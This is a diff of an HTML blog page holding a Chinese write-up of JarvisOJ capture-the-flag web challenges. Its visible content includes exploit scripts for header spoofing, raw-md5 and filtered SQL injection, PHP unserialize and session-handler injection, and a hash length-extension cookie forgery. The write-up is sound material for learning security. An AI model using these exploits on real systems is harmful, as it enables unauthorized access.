@@ -10,7 +10,7 @@
 
     <!--Description-->
     
-        <meta name="description" content="真是被自己菜哭了，暑假第一个月一定要把WEB刷完写完WP！">
+        <meta name="description" content="对未来的最大慷慨，就是把一切都献给现在！">
     
 
     <!--Author-->
@@ -25,9 +25,11 @@
 
     <!--Open Graph Description-->
     
+        <meta property="og:description" content="对未来的最大慷慨，就是把一切都献给现在！">
+    
 
     <!--Open Graph Site Name-->
-    <meta property="og:site_name" content="Hexo">
+    <meta property="og:site_name" content="Luc1fer&#39;blog">
 
     <!--Type page-->
     
@@ -42,7 +44,7 @@
 
     <!-- Title -->
     
-    <title>JarvisOJ WP - Hexo</title>
+    <title>JarvisOJ WP - Luc1fer&#39;blog</title>
 
     <!-- Bootstrap Core CSS -->
     <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.2/css/bootstrap.min.css" integrity="sha384-y3tfxAZXuh4HwSYylfB+J125MxIs6mR5FOHamPBG064zB+AFeWH94NdvaCBm8qnd" crossorigin="anonymous">
@@ -90,12 +92,6 @@
             <li class="menu-item">
                 <a href="/archives">
                     Archives
-                </a>
-            </li>
-            
-            <li class="menu-item">
-                <a href="/about.html">
-                    About
                 </a>
             </li>
             
@@ -149,8 +145,6 @@
                 <span class="date">2019-08-01</span>
             
             
-                <a href="#disqus_thread" class="comments">Comments</a>
-            
             
                 <span class="category">
                     <a href="/categories/WP/">WP</a>
@@ -176,11 +170,11 @@
 <p>题目要求localhost only,我们可以通过伪造X-FORWARDED-FOR来达到目的</p>
 <pre><code>import requests
 
-url=&#39;http://web.jarvisoj.com:32774/&#39;
+url=&apos;http://web.jarvisoj.com:32774/&apos;
 
 s=requests.session()
 data={
-&#39;X-FORWARDED-FOR&#39;:&#39;127.0.0.1&#39;
+&apos;X-FORWARDED-FOR&apos;:&apos;127.0.0.1&apos;
 }
 r=s.get(url,headers=data)
 print(r.text)</code></pre><p>返回信息包含flag</p>
@@ -198,7 +192,7 @@ print(r.text)</code></pre><p>返回信息包含flag</p>
 </ol>
 <h3 id="Login"><a href="#Login" class="headerlink" title="Login"></a>Login</h3><p>题目链接：<a href="http://web.jarvisoj.com:32772/" target="_blank" rel="noopener">http://web.jarvisoj.com:32772/</a></p>
 <p>打开题目是一个密码的提交框，随便测一下没什么收获，查看请求信息发现HINT在响应头里</p>
-<pre><code>&quot;select * from `admin` where password=&#39;&quot;.md5($pass,true).&quot;&#39;&quot;</code></pre><p>这里将md5后的密码提交查询，注意到md5的第二个参数为true</p>
+<pre><code>&quot;select * from `admin` where password=&apos;&quot;.md5($pass,true).&quot;&apos;&quot;</code></pre><p>这里将md5后的密码提交查询，注意到md5的第二个参数为true</p>
 <pre><code>string md5( string $str[, bool $raw_output = false] )</code></pre><p><strong>raw_output<br>如果可选的 raw_output 被设置为 TRUE，那么 MD5 报文摘要将以16字节长度的原始二进制格式返回。</strong></p>
 <p>我们需要寻找一个字符串在md5之后含有 <code>&#39; or &#39;</code> 之类的可以产生闭合的。</p>
 <p>国外的大佬在2010年跑出来了几个符合条件的<a href="http://cvk.posthaven.com/sql-injection-with-raw-md5-hashes" title="这是那篇博客" target="_blank" rel="noopener">http://cvk.posthaven.com/sql-injection-with-raw-md5-hashes</a></p>
@@ -210,9 +204,9 @@ ffifdyop</code></pre><h3 id="神盾局的秘密"><a href="#神盾局的秘密" c
 <p><code>http://web.jarvisoj.com:32768/showimg.php?img=c2hpZWxkLmpwZw==</code></p>
 <p>尝试编码index.php读源码</p>
 <pre><code>&lt;?php 
-    require_once(&#39;shield.php&#39;);
+    require_once(&apos;shield.php&apos;);
     $x = new Shield();
-    isset($_GET[&#39;class&#39;]) &amp;&amp; $g = $_GET[&#39;class&#39;];
+    isset($_GET[&apos;class&apos;]) &amp;&amp; $g = $_GET[&apos;class&apos;];
     if (!empty($g)) {
         $x = unserialize($g);
     }
@@ -222,13 +216,13 @@ ffifdyop</code></pre><h3 id="神盾局的秘密"><a href="#神盾局的秘密" c
     //flag is in pctf.php
     class Shield {
         public $file;
-        function __construct($filename = &#39;&#39;) {
+        function __construct($filename = &apos;&apos;) {
             $this -&gt; file = $filename;
         }
 
         function readfile() {
-            if (!empty($this-&gt;file) &amp;&amp; stripos($this-&gt;file,&#39;..&#39;)===FALSE  
-            &amp;&amp; stripos($this-&gt;file,&#39;/&#39;)===FALSE &amp;&amp; stripos($this-&gt;file,&#39;\\&#39;)==FALSE) {
+            if (!empty($this-&gt;file) &amp;&amp; stripos($this-&gt;file,&apos;..&apos;)===FALSE  
+            &amp;&amp; stripos($this-&gt;file,&apos;/&apos;)===FALSE &amp;&amp; stripos($this-&gt;file,&apos;\\&apos;)==FALSE) {
                 return @file_get_contents($this-&gt;file);
             }
         }
@@ -238,13 +232,13 @@ ffifdyop</code></pre><h3 id="神盾局的秘密"><a href="#神盾局的秘密" c
     //flag is in pctf.php
 class Shield {
     public $file;
-    function __construct($filename = &#39;&#39;) {
+    function __construct($filename = &apos;&apos;) {
         $this -&gt; file = $filename;
     }
 
     function readfile() {
-        if (!empty($this-&gt;file) &amp;&amp; stripos($this-&gt;file,&#39;..&#39;)===FALSE  
-        &amp;&amp; stripos($this-&gt;file,&#39;/&#39;)===FALSE &amp;&amp; stripos($this-&gt;file,&#39;\\&#39;)==FALSE) {
+        if (!empty($this-&gt;file) &amp;&amp; stripos($this-&gt;file,&apos;..&apos;)===FALSE  
+        &amp;&amp; stripos($this-&gt;file,&apos;/&apos;)===FALSE &amp;&amp; stripos($this-&gt;file,&apos;\\&apos;)==FALSE) {
             return @file_get_contents($this-&gt;file);
         }
     }
@@ -259,20 +253,20 @@ echo serialize($example);
 error_reporting(0);
 echo &quot;&lt;!--index.phps--&gt;&quot;;
 
-if(!$_GET[&#39;id&#39;])
+if(!$_GET[&apos;id&apos;])
 {
-    header(&#39;Location: index.php?id=1&#39;);
+    header(&apos;Location: index.php?id=1&apos;);
     exit();
 }
-$id=$_GET[&#39;id&#39;];
-$a=$_GET[&#39;a&#39;];
-$b=$_GET[&#39;b&#39;];
-if(stripos($a,&#39;.&#39;))
+$id=$_GET[&apos;id&apos;];
+$a=$_GET[&apos;a&apos;];
+$b=$_GET[&apos;b&apos;];
+if(stripos($a,&apos;.&apos;))
 {
-    echo &#39;Hahahahahaha&#39;;
+    echo &apos;Hahahahahaha&apos;;
     return ;
 }
-$data = @file_get_contents($a,&#39;r&#39;);
+$data = @file_get_contents($a,&apos;r&apos;);
 if($data==&quot;1112 is a nice lab!&quot; and $id==0 and strlen($b)&gt;5 and eregi(&quot;111&quot;.substr($b,0,1),&quot;1114&quot;) and substr($b,0,1)!=4)
 {
     require(&quot;flag.txt&quot;);
@@ -301,7 +295,7 @@ else
 <pre><code>http://web.jarvisoj.com:32780/^HT2mCpcvOLf/index.php?id=1</code></pre><p>现在开始这是一道注入题了</p>
 <p>测试id=2,返回</p>
 <pre><code>SELECT * FROM content WHERE id=2</code></pre><p>id=1’</p>
-<pre><code>SELECT * FROM content WHERE id=1&#39;</code></pre><p>id=1 and 1=1 #</p>
+<pre><code>SELECT * FROM content WHERE id=1&apos;</code></pre><p>id=1 and 1=1 #</p>
 <pre><code>you bad boy/girl!</code></pre><p>测试发现我们不需要闭合单引号与注释，同时过滤了空格。对于空格首先尝试/**/，发现不行，那么/*a*/呢？</p>
 <pre><code>?id=1/*a*/and/*a*/1=1 
 hi666</code></pre><p>这样可以。然后猜测字段个数</p>
@@ -341,9 +335,9 @@ hi666</code></pre><p>这样可以。然后猜测字段个数</p>
             }
         } else {
             $s = serialize($role);
-            setcookie(&#39;role&#39;,$s);
+            setcookie(&apos;role&apos;,$s);
             $hsh = md5($salt.strrev($s));
-            setcookie(&#39;hsh&#39;,$hsh);
+            setcookie(&apos;hsh&apos;,$hsh);
         }
         if ($auth) {
             echo &quot;&lt;h3&gt;Welcome Admin. Your flag is &quot;
@@ -386,30 +380,30 @@ hsh: fcdc3840332555511c4e4323f6decb07</code></pre><p>放在cookie里就可以了
 <pre><code># -*- coding: utf-8 -*-
 import requests,hashpumpy,urllib
 def webre(): #py2
-url = &#39;http://web.jarvisoj.com:32778/&#39;
-sha = &#39;3a4727d57463f122833d9e732f94e4e0&#39;
-string0 = &#39;;&quot;tseug&quot;:5:s&#39;
-string1 = &#39;;&quot;nimda&quot;:5:s&#39;
+url = &apos;http://web.jarvisoj.com:32778/&apos;
+sha = &apos;3a4727d57463f122833d9e732f94e4e0&apos;
+string0 = &apos;;&quot;tseug&quot;:5:s&apos;
+string1 = &apos;;&quot;nimda&quot;:5:s&apos;
 for i in range(15):
     digest, message = hashpumpy.hashpump(sha,string0,string1,i)
-    payload ={&#39;role&#39;:urllib.quote(message[::-1]), &#39;hsh&#39;:digest}
-    #payload ={&#39;role&#39;:(message[::-1]), &#39;hsh&#39;:digest}
+    payload ={&apos;role&apos;:urllib.quote(message[::-1]), &apos;hsh&apos;:digest}
+    #payload ={&apos;role&apos;:(message[::-1]), &apos;hsh&apos;:digest}
     print i,payload
     html = requests.get(url,cookies=payload).text#提交答案
-    if &#39;Welcome&#39; in html:
+    if &apos;Welcome&apos; in html:
         print html
 
 webre()</code></pre><h3 id="phpinfo"><a href="#phpinfo" class="headerlink" title="phpinfo"></a>phpinfo</h3><p>题目链接：<a href="http://web.jarvisoj.com:32784/" target="_blank" rel="noopener">http://web.jarvisoj.com:32784/</a></p>
 <pre><code>&lt;?php
 //A webshell is wait for you
-ini_set(&#39;session.serialize_handler&#39;, &#39;php&#39;);
+ini_set(&apos;session.serialize_handler&apos;, &apos;php&apos;);
 session_start();
 class OowoO
 {
     public $mdzz;
     function __construct()
     {
-        $this-&gt;mdzz = &#39;phpinfo();&#39;;
+        $this-&gt;mdzz = &apos;phpinfo();&apos;;
     }
 
     function __destruct()
@@ -417,13 +411,13 @@ class OowoO
         eval($this-&gt;mdzz);
     }
 }
-if(isset($_GET[&#39;phpinfo&#39;]))
+if(isset($_GET[&apos;phpinfo&apos;]))
 {
     $m = new OowoO();
 }
 else
 {
-    highlight_string(file_get_contents(&#39;index.php&#39;));
+    highlight_string(file_get_contents(&apos;index.php&apos;));
 }
 ?&gt;</code></pre><p>观察到题目phpinfo中的配置</p>
 <p><img src="http://wx1.sinaimg.cn/mw690/006boCb9ly1g5k7ltycs7j30we056t8z.jpg" alt></p>
@@ -436,7 +430,7 @@ else
 <p>然后进行序列化。将处理器设置为<code>php_serialize</code></p>
 <pre><code>&lt;?php
 //A webshell is wait for you
-ini_set(&#39;session.serialize_handler&#39;, &#39;php_serialize&#39;);
+ini_set(&apos;session.serialize_handler&apos;, &apos;php_serialize&apos;);
 session_start();
 class OowoO
 {
@@ -444,7 +438,7 @@ public $mdzz;
 
 }
 $a = new OowoO();
-$a-&gt;mdzz = &#39;print_r(scandir(dirname(__FILE__)));&#39;;
+$a-&gt;mdzz = &apos;print_r(scandir(dirname(__FILE__)));&apos;;
 echo serialize($a);
 ?&gt;</code></pre><p>得到</p>
 <pre><code>O:5:&quot;OowoO&quot;:1:{s:4:&quot;mdzz&quot;;s:36:&quot;print_r(scandir(dirname(__FILE__)));&quot;;}</code></pre><p>先在本地打开POST页面，随便提交一个东西然后抓包将<code>filename</code>改为序列化字符串。同时为了达到使用php解释后得到我们想要的结果，要在最前面加上<code>|</code>，同时为了防止转义，在引号前面加上<code>\</code>.</p>
@@ -500,16 +494,6 @@ Warning: assert(): Assertion &quot;eval($_POST[360])&quot; failed in E:\only_for
 
     <!-- Comments -->
     
-    <div class="comments">
-        
-<div id="disqus_thread">
-    <noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
-</div>
-
-
-
-    </div>
-    
 
 </div>
         </section>
@@ -529,7 +513,7 @@ Warning: assert(): Assertion &quot;eval($_POST[360])&quot; failed in E:\only_for
             <div class="col-xs-12 col-sm-12 col-md-6 col-lg-6 footer-about">
                 <h2>About</h2>
                 <p>
-                    This theme was developed by <a href="https://github.com/klugjo">Jonathan Klughertz</a>. The source code is available on Github. Create Websites. Make Magic.
+                    This theme was developed by <a href="">Jonathan Klughertz</a>. The source code is available on Github. Create Websites. Make Magic.
                 </p>
             </div>
             
@@ -550,7 +534,7 @@ Warning: assert(): Assertion &quot;eval($_POST[360])&quot; failed in E:\only_for
             </li>
             
             <li>
-                <a class="footer-post" href="/2019/08/19/Black_magic/">black_magic</a>
+                <a class="footer-post" href="/2019/08/19/Black-magic/">black_magic</a>
             </li>
             
         </ul>
@@ -568,11 +552,11 @@ Warning: assert(): Assertion &quot;eval($_POST[360])&quot; failed in E:\only_for
         </li>
         
         <li>
-            <a class="footer-post" href="/categories/wp/">wp</a>
+            <a class="footer-post" href="/categories/docker/">docker</a>
         </li>
         
         <li>
-            <a class="footer-post" href="/categories/docker/">docker</a>
+            <a class="footer-post" href="/categories/wp/">wp</a>
         </li>
         
         <li>
@@ -648,18 +632,6 @@ Warning: assert(): Assertion &quot;eval($_POST[360])&quot; failed in E:\only_for
 <script src="/js/main.js"></script>
 
 <!-- Disqus Comments -->
-
-<script type="text/javascript">
-    var disqus_shortname = 'klugjotest';
-
-    (function(){
-        var dsq = document.createElement('script');
-        dsq.type = 'text/javascript';
-        dsq.async = true;
-        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
-        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
-    }());
-</script>
 
 
 
